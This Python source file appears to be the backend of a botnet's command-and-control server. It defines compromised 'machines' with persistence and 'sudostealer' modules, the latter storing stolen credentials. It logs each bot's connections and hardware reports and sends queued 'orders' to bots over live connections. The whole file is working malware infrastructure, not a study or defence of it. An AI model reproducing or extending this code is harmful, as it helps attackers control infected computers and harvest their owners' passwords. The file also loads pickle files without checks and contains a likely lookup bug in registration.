from datetime import datetime
import pickle, os, traceback
from typing import Self
from glob import glob
from pydantic import BaseModel
import orders
import con

class PersistenceModule(BaseModel):
	enabled: bool = False

class SudostealerModule(BaseModel):
	enabled: bool = False
	credentials: list[str] = []

class SpecsModule(BaseModel):
	timestamp: int = -1
	report: dict = {}

class Machine(BaseModel):
	id: str
	version: int
	connections: dict[str, list[int]] = {}
	connected: bool = False
	persistence: PersistenceModule = PersistenceModule()
	sudostealer: SudostealerModule = SudostealerModule()
	specs: SpecsModule = SpecsModule()

	async def on_register(self, host):
		self._register_connection(host)
		await con.broadcast_machine_update(all[self.id])
	
	async def on_connect(self, host):
		self.connected = True
		self._register_connection(host)
		await self.send_pending_orders()
		await con.broadcast_machine_update(self)
	
	def _register_connection(self, host):
		time = int(datetime.now().timestamp())
		if host in self.connections:
			self.connections[host].append(time)
		else:
			self.connections[host] = [time]
		self.save()
	
	async def on_disconnect(self, host):
		self.connected = False
		try:
			await con.broadcast_machine_update(self)
		except:
			traceback.print_exc()
		finally:
			del con.active_machines[self.id]

	def save(self):
		with open(f'data/machines/{self.id}.pkl', 'wb') as f:
			pickle.dump(self, f)

	def __setattr__(self, key, value):
		super().__setattr__(key, value)
		if self.id:
			self.save()

	def load_all() -> list[Self]:
		machines = []
		for i in glob("data/machines/*.pkl"):
			with open(i, 'rb') as f:
				m = pickle.load(f)
				m.connected = False
				machines.append(m)
		return machines
	
	def get_pending_orders(self) -> list[orders.Order]:
		return [i for i in orders.all.values() if self.id in i.pending]
	
	async def send_pending_orders(self):
		if self.id not in con.active_machines:
			return
		pending = self.get_pending_orders()
		if not pending:
			return
		try:
			await con.active_machines[self.id].send_json({"event":"order", "orders":[i.data for i in pending]})
		except:
			traceback.print_exc()
		else:
			for i in pending:
				i.pending.remove(self.id)
				i.done.append(self.id)
				await con.broadcast_order_update(i)
	
	def update_specs(self, report):
		self.specs.timestamp = int(datetime.now().timestamp())
		self.specs.report = report


os.makedirs("data/machines", exist_ok=True)
all: dict[str, Machine] = {i.id: i for i in Machine.load_all()}